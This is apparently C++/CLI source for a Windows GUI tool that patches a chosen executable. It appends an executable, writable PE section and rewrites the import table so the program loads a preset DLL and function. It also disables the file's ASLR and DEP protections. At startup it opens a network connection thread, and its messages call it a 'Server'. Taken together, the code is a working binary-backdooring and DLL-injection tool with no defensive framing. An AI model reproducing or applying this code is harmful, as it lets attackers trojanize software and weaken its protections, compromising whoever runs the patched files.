#include "Main.h"

//#define _WINSOCK_DEPRECATED_NO_WARNINGS

	System::Void MainForm::btnBrowse_Click(System::Object^ sender, System::EventArgs^ e)
	{
		OpenFileDialog^ openFileDialog = gcnew OpenFileDialog;
		openFileDialog->Filter = "exe files (*.exe)|*.exe";
		openFileDialog->ShowDialog();
		txtBoxFile->Text = openFileDialog->FileName;
	}

	System::Void MainForm::btnRun_Click(System::Object^ sender, System::EventArgs^ e)
	{
		if (txtBoxFile->Text != "")
			if (CheckSectionExist(SystemStringToCharPointer(txtBoxFile->Text)))
				SetText(gcnew String("Dll already injected. Just run your file.\n"));
			else
			{
				if (InjectDll(this, SystemStringToCharPointer(txtBoxFile->Text), SectionName, SectionSize))
					SetText(gcnew String("Dll injected. Now run your file!\n"));
				else
				{
					SetText(gcnew String("Error dll injection!\n"));
					return;
				}
			}
		else SetText(gcnew String("No file choosed.\n"));
	}

	void MainForm::SetText(String^ string)
	{
		if (txtBoxMultiline->InvokeRequired)
			txtBoxMultiline->Invoke(gcnew SetTextUI(this, &MainForm::SetText), string);
		else txtBoxMultiline->AppendText(string);
	}

	void MainForm::ClearScreen()
	{
		if (txtBoxMultiline->InvokeRequired)
			txtBoxMultiline->Invoke(gcnew ClearScreenUI(this, &MainForm::ClearScreen));
		else txtBoxMultiline->Clear();
		
	}

	BOOL CheckSectionExist(char* filepath)
	{
		HANDLE file = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == INVALID_HANDLE_VALUE)
		{
			MessageBox::Show("Error open source file.", "Server Error", MessageBoxButtons::OK, MessageBoxIcon::Error);
			return false;
		}
		DWORD fileSize = GetFileSize(file, NULL);
		BYTE *pByte = new BYTE[fileSize];
		DWORD dw;
		//lets read the entire file,so we can use the PE information
		ReadFile(file, pByte, fileSize, &dw, NULL);
		PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
		if (dos->e_magic != IMAGE_DOS_SIGNATURE)
		{
			MessageBox::Show("Invalid PE file.", "Server Error", MessageBoxButtons::OK, MessageBoxIcon::Error);
			return false; //invalid PE
		}
		PIMAGE_FILE_HEADER FH = (PIMAGE_FILE_HEADER)(pByte + dos->e_lfanew + sizeof(DWORD));
		PIMAGE_SECTION_HEADER SH = (PIMAGE_SECTION_HEADER)(pByte + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS));
		if (strcmp((char*)(SH[FH->NumberOfSections - 1].Name) , SectionName) == 0)
		{
			CloseHandle(file);
			return TRUE;
		}
		else { CloseHandle(file); return FALSE; }
	}

	char* SystemStringToCharPointer(String^ string)
	{
		array<Byte> ^chars = System::Text::Encoding::ASCII->GetBytes(string);
		pin_ptr<Byte> charsPointer = &(chars[0]);
		char *filePath = reinterpret_cast<char *>(static_cast<unsigned char *>(charsPointer));
		std::string native(filePath, chars->Length);
		return filePath;
	}

	DWORD align(DWORD size, DWORD align, DWORD addr) {
		if (!(size % align))
			return addr + size;
		return addr + (size / align + 1) * align;
	}

	/*Convert Virtual Address to File Offset */
	DWORD Rva2Offset(DWORD rva, PIMAGE_SECTION_HEADER psh, PIMAGE_NT_HEADERS pnt)
	{
		size_t i = 0;
		PIMAGE_SECTION_HEADER pSeh;
		if (rva == 0)
			return (rva);
		pSeh = psh;
		for (i = 0; i < pnt->FileHeader.NumberOfSections; i++)
		{
			if (rva >= pSeh->VirtualAddress && rva < pSeh->VirtualAddress + pSeh->Misc.VirtualSize)
				break;
			pSeh++;
		}
		return (rva - pSeh->VirtualAddress + pSeh->PointerToRawData);
	}

	bool AddSection(HANDLE file, char *sectionName, DWORD sizeOfSection, DWORD fileSize, BYTE *pByte)
	{
		PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
		if (dos->e_magic != IMAGE_DOS_SIGNATURE)
		{
			MessageBox::Show("Invalid PE file.", "Server Error", MessageBoxButtons::OK, MessageBoxIcon::Error);
			return false; //invalid PE
		}
		PIMAGE_FILE_HEADER FH = (PIMAGE_FILE_HEADER)(pByte + dos->e_lfanew + sizeof(DWORD));
		PIMAGE_OPTIONAL_HEADER OH = (PIMAGE_OPTIONAL_HEADER)(pByte + dos->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
		PIMAGE_SECTION_HEADER SH = (PIMAGE_SECTION_HEADER)(pByte + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS));

		ZeroMemory(&SH[FH->NumberOfSections], sizeof(IMAGE_SECTION_HEADER));
		CopyMemory(&SH[FH->NumberOfSections].Name, sectionName, 8);
		//We use 8 bytes for section name,cause it is the maximum allowed section name size

		////////printf("%#010x\n",OH->SectionAlignment);

		//lets insert all the required information about our new PE section
		SH[FH->NumberOfSections].Misc.VirtualSize = align(sizeOfSection, OH->SectionAlignment, 0);
		SH[FH->NumberOfSections].VirtualAddress = align(SH[FH->NumberOfSections - 1].Misc.VirtualSize, OH->SectionAlignment, SH[FH->NumberOfSections - 1].VirtualAddress);
		SH[FH->NumberOfSections].SizeOfRawData = align(sizeOfSection, OH->FileAlignment, 0);
		SH[FH->NumberOfSections].PointerToRawData = align(SH[FH->NumberOfSections - 1].SizeOfRawData, OH->FileAlignment, SH[FH->NumberOfSections - 1].PointerToRawData);
		SH[FH->NumberOfSections].Characteristics = 0xE00000E0;
		/*
		0xE00000E0 = IMAGE_SCN_MEM_WRITE |
		IMAGE_SCN_CNT_CODE  |
		IMAGE_SCN_CNT_UNINITIALIZED_DATA  |
		IMAGE_SCN_MEM_EXECUTE |
		IMAGE_SCN_CNT_INITIALIZED_DATA |
		IMAGE_SCN_MEM_READ
		*/
		SetFilePointer(file, SH[FH->NumberOfSections].PointerToRawData + SH[FH->NumberOfSections].SizeOfRawData, NULL, FILE_BEGIN);
		//end the file right here,on the last section + it's own size
		SetEndOfFile(file);
		//now lets change the size of the image,to correspond to our modifications
		//by adding a new section,the image size is bigger now
		OH->SizeOfImage = SH[FH->NumberOfSections].VirtualAddress + SH[FH->NumberOfSections].Misc.VirtualSize;
		//and we added a new section,so we change the NOS too
		FH->NumberOfSections += 1;

		//disable the ASLR
		if ((OH->DllCharacteristics & 0x40) == 0x40)
			OH->DllCharacteristics = OH->DllCharacteristics ^ 0x40;
		//disable the DEP
		if ((OH->DllCharacteristics & 0x100) == 0x100)
			OH->DllCharacteristics = OH->DllCharacteristics ^ 0x100;

		SetFilePointer(file, 0, NULL, FILE_BEGIN);
		//and finaly,we add all the modifications to the file
		DWORD dw;
		WriteFile(file, pByte, fileSize, &dw, NULL);

		return true;
	}

	bool InjectDll(MainForm^ s, char *filepath, char *sectionName, DWORD sizeOfSection)
	{
		HANDLE file = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == INVALID_HANDLE_VALUE)
		{
			MessageBox::Show("Error open source file.", "Server Error", MessageBoxButtons::OK, MessageBoxIcon::Error);
			return false;
		}
		DWORD fileSize = GetFileSize(file, NULL);
		BYTE *pByte = new BYTE[fileSize];
		DWORD dw;
		//lets read the entire file,so we can use the PE information
		ReadFile(file, pByte, fileSize, &dw, NULL);

		if (!AddSection(file, sectionName, sizeOfSection, fileSize, pByte))
		{
			MessageBox::Show("Error adding section.", "Server Error", MessageBoxButtons::OK, MessageBoxIcon::Error);
			return false;
		}
		
		PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
		//Import Directory RVA
		PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew);
		PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(nt);
		PIMAGE_IMPORT_DESCRIPTOR image_import_descriptor;
		image_import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD_PTR)pByte + \
			Rva2Offset(nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, first, nt));
		PIMAGE_SECTION_HEADER last = first + (nt->FileHeader.NumberOfSections - 1);

		// Change Import directory entry point to ours
		nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = last->VirtualAddress + FreeSpace * sizeof(DWORD);//last->VirtualAddress
		SetFilePointer(file, 0, NULL, FILE_BEGIN);
		//add the modifications to the file
		WriteFile(file, pByte, fileSize, &dw, NULL);

		DWORD z = 0;
		SetFilePointer(file, last->PointerToRawData, NULL, FILE_BEGIN);
		for (int i = 0; i < FreeSpace; i++)
			WriteFile(file, (LPCVOID*)&z, sizeof(DWORD), &dw, 0);
		
		// Copy IMAGE_IMPORT_DESCRIPTOR to a new sector
		int word_num = FreeSpace;
		while (image_import_descriptor->Name != NULL)
		{
			WriteFile(file, (LPCVOID*)&(image_import_descriptor)->Characteristics, sizeof(DWORD), &dw, 0);
			WriteFile(file, (LPCVOID*)&(image_import_descriptor)->TimeDateStamp, sizeof(DWORD), &dw, 0);
			WriteFile(file, (LPCVOID*)&(image_import_descriptor)->ForwarderChain, sizeof(DWORD), &dw, 0);
			WriteFile(file, (LPCVOID*)&(image_import_descriptor)->Name, sizeof(DWORD), &dw, 0);
			WriteFile(file, (LPCVOID*)&(image_import_descriptor)->FirstThunk, sizeof(DWORD), &dw, 0);
			image_import_descriptor++; //advance to next IMAGE_IMPORT_DESCRIPTOR
			word_num += 5;
		}

		char* dll_name = DLL_NAME;
		char* dll_func = DLL_FUNC_NAME;
		DWORD NewImageImportDescriptor = last->VirtualAddress + word_num * sizeof(DWORD);
		DWORD DllName = NewImageImportDescriptor + DESCRIPTOR_SPACE;
		DWORD DllFuncName = DllName + strlen(dll_name) + 1;
		DWORD DllFuncAddress = DllFuncName + strlen(dll_func) + 2 + 1;
		DWORD Address = DllFuncAddress + 2 * sizeof(DWORD);
		DWORD zero = 0;
		DWORD AddressValue = 0x10001020;

		// Create a new descriptor for our dll
		WriteFile(file, (LPCVOID*)&DllFuncAddress, sizeof(DWORD), &dw, 0);	//swap
		WriteFile(file, (LPCVOID*)&zero, sizeof(DWORD), &dw, 0);
		WriteFile(file, (LPCVOID*)&zero, sizeof(DWORD), &dw, 0);
		WriteFile(file, (LPCVOID*)&DllName, sizeof(DWORD), &dw, 0);
		WriteFile(file, (LPCVOID*)&Address, sizeof(DWORD), &dw, 0);			//swap
		WriteFile(file, (LPCVOID*)&zero, sizeof(DWORD), &dw, 0);
		WriteFile(file, (LPCVOID*)&zero, sizeof(DWORD), &dw, 0);
		WriteFile(file, (LPCVOID*)&zero, sizeof(DWORD), &dw, 0);
		WriteFile(file, (LPCVOID*)&zero, sizeof(DWORD), &dw, 0);
		WriteFile(file, (LPCVOID*)&zero, sizeof(DWORD), &dw, 0);
		WriteFile(file, dll_name, strlen(dll_name), &dw, 0);
		WriteFile(file, (LPCVOID*)&zero, 3, &dw, 0);
		WriteFile(file, dll_func, strlen(dll_func), &dw, 0);
		WriteFile(file, (LPCVOID*)&zero, 1, &dw, 0);
		//WriteFile(file, (LPCVOID*)&AddressValue, sizeof(DWORD), &dw, 0);		//swap
		WriteFile(file, (LPCVOID*)&DllFuncName, sizeof(DWORD), &dw, 0);			//swap
		WriteFile(file, (LPCVOID*)&zero, sizeof(DWORD), &dw, 0);
		WriteFile(file, (LPCVOID*)&AddressValue, sizeof(DWORD), &dw, 0);		//swap
		//WriteFile(file, (LPCVOID*)&DllFuncName, sizeof(DWORD), &dw, 0);		//swap

		CloseHandle(file);
		return true;
	}

	void OpenConnection(MainForm^ form)
	{
		WinsockConnection^ winsockConn = gcnew WinsockConnection(form);
		Thread^ thread = gcnew Thread(gcnew ThreadStart(winsockConn, &WinsockConnection::Connection));
		thread->Start();
	}

	[STAThread]
	int main(array<String^>^ args) {
		Application::EnableVisualStyles();
		Application::SetCompatibleTextRenderingDefault(false);
		MainForm ^form = gcnew MainForm();
		OpenConnection(form);
		Application::Run(form);
		return 0;
	}

